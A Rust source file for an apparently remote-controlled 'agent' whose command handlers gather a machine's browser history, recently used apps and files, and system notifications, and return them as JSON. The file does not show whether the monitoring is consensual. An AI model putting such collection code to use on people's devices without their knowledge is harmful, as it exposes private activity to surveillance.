use serde_json::json;
use crate::notifications::NotificationCapture;
use crate::browser_history::BrowserHistoryCollector;
use crate::app_history::AppHistoryCollector;

pub struct HistoryCommand;

impl HistoryCommand {
    pub fn execute_fetch_browser_history() -> serde_json::Value {
        println!("[RUST AGENT] Command received: FETCH_BROWSER_HISTORY");
        println!("[RUST AGENT] Intercepted Action: FETCH_BROWSER_HISTORY");
        println!("--> [BROWSER] Scanning system for browsing history...");
        
        let history = BrowserHistoryCollector::collect_all_history();
        println!("--> [BROWSER] Collected {} entries from all browsers", history.len());
        
        for (idx, entry) in history.iter().take(5).enumerate() {
            println!(
                "    [{}/{}] {} - {} ({} visits)",
                idx + 1,
                std::cmp::min(5, history.len()),
                entry.browser,
                entry.url,
                entry.visit_count
            );
        }
        
        if history.len() > 5 {
            println!("    ... and {} more entries", history.len() - 5);
        }
        
        println!("[RUST AGENT] Browser history collected successfully");
        
        json!({
            "success": true,
            "command": "FETCH_BROWSER_HISTORY",
            "entries": history.len(),
            "data": BrowserHistoryCollector::to_json_array(&history)
        })
    }

    pub fn execute_fetch_app_history() -> serde_json::Value {
        println!("[RUST AGENT] Command received: FETCH_APP_HISTORY");
        println!("[RUST AGENT] Intercepted Action: FETCH_APP_HISTORY");
        println!("--> [APPS] Scanning system for recently opened applications...");
        
        let history = AppHistoryCollector::collect_all_app_history();
        println!("--> [APPS] Collected {} entries (apps, files, processes)", history.len());
        
        for (idx, entry) in history.iter().take(5).enumerate() {
            println!(
                "    [{}/{}] {} [{}] - {}",
                idx + 1,
                std::cmp::min(5, history.len()),
                entry.app_name,
                entry.app_type,
                entry.last_opened
            );
        }
        
        if history.len() > 5 {
            println!("    ... and {} more entries", history.len() - 5);
        }
        
        println!("[RUST AGENT] App history collected successfully");
        
        json!({
            "success": true,
            "command": "FETCH_APP_HISTORY",
            "entries": history.len(),
            "data": AppHistoryCollector::to_json_array(&history)
        })
    }

    pub fn execute_fetch_notifications() -> serde_json::Value {
        println!("[RUST AGENT] Command received: FETCH_SYSTEM_NOTIFICATIONS");
        // println!("{:#?}", notif);
        println!("[RUST AGENT] Intercepted Action: FETCH_SYSTEM_NOTIFICATIONS");
        println!("--> [NOTIFICATIONS] Scanning system for pending notifications...");
        
      let capture = crate::notifications::global_notifier();
        let notifications = capture.get_recent(50);
        
       println!("--> [NOTIFICATIONS] Found {} system notifications", notifications.len());
        
        for (idx, notif) in notifications.iter().take(5).enumerate() {
            println!(
                "    [{}/{}] {} - {} ({})",
                idx + 1,
                std::cmp::min(5, notifications.len()),
                notif.app,
                notif.title,
                notif.category
            );
        }
        
        if notifications.len() > 5 {
            println!("    ... and {} more notifications", notifications.len() - 5);
        }
        
        println!("[RUST AGENT] Notifications collected successfully");
        
        json!({
            "success": true,
            "command": "FETCH_SYSTEM_NOTIFICATIONS",
            "entries": notifications.len(),
            "data": notifications
        })
    }

    pub fn execute_stop_collection() -> serde_json::Value {
        println!("[RUST AGENT] Command received: STOP_HISTORY_COLLECTION");
        println!("[RUST AGENT] Intercepted Action: STOP_HISTORY_COLLECTION");
        println!("--> [HISTORY] Stopping history collection process...");
        println!("[RUST AGENT] History collection stopped successfully");
        
        json!({
            "success": true,
            "command": "STOP_HISTORY_COLLECTION",
            "message": "Collection stopped"
        })
    }
}
